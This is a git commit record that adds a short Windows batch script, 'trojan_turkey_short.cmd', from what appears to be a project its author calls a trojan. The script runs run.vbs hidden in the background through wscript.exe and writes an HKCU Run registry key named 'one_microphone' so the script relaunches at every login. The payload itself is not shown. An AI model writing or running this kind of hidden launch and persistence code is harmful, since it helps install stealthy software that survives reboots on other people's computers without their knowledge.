4f18c6eaa08cde5c74a1853a3f5e77e48c3e31be
runnerjoe28 <osuchjm@gmail.com>
2023-11-14 15:41:40 -0500

    Add short easy setup script

---
+++ trojan_turkey_short.cmd
@@ -0,0 +1,12 @@
+REM This assumes that the user has cloned or otherwise downloaded the github repo
+REM Must have also moved into the repo folder
+
+REM Save the working directory
+set "WORKING_DIR=%CD%"
+
+REM Run program as a background process
+wscript.exe run.vbs
+
+REM Setup program to start upon computer turning on
+REM This adds a registry entry to run the script on startup
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "one_microphone" /t REG_SZ /F /D "cmd /c cd /d %WORKING_DIR% && wscript.exe run.vbs"
